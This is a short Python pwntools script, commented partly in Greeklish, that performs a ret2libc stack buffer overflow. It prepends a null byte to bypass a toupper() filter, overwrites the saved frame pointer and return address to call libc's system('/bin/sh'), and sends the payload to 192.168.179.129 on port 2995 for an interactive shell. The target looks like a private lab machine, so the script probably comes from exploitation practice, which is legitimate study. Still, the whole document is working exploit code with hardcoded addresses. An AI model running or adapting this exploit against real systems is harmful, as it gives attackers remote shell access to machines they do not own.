

from pwn import *

# Tha grapsoume ena ret2libc xrhsimopoiwndas gadgets. Auto pou theloume na knaei to exploit
# einai na kalesei thn system("/bin/sh")


libc_base_addr = 0xb7e97000
libc__system_offset  = 0x00038fb0 # offset of system function within libc
libc__bin_sh_offset  = 0x0011f3bf # offset of string literal "/bin/sh\0" within libc

ebp__buffer_offset = 0x210 # ebp - 0x210 == buffer

payload = bytearray()
payload += pack(0x00, 8, 'little', False) # "\0" to bypass the "toupper()" modification
payload.extend(bytearray("A"*(ebp__buffer_offset-1), encoding='utf-8'))    # will overwrite stack frame until old ebp (excluding). -1 since we write \0x00 in the above line
payload += b"AAAA"  # old ebp
payload += pack((libc_base_addr + libc__system_offset), 32, 'little', False) # Overwrite ret_addr to redircet to sytem. 0xb7ecffb0
payload += pack(0x42424242, 32, 'little', False) # return address after system finishes
payload += pack((libc_base_addr + libc__bin_sh_offset), 32, 'little', False) # push address of "/bin/sh\0"

for b in payload:
    if b == 0x0a or b == 0x0d:  # Check for \n or \b
        print("ERROR: payload contains byte: " + hex(b))
        assert(False)
payload += b"\n" # In order to termiante input

print("----- Payload -----")
print(payload) # for debugging
print("----- ------- -----")

# Connect to remote and send the payload
conn = remote("192.168.179.129", 2995)
conn.send(payload)

conn.interactive()

conn.close()
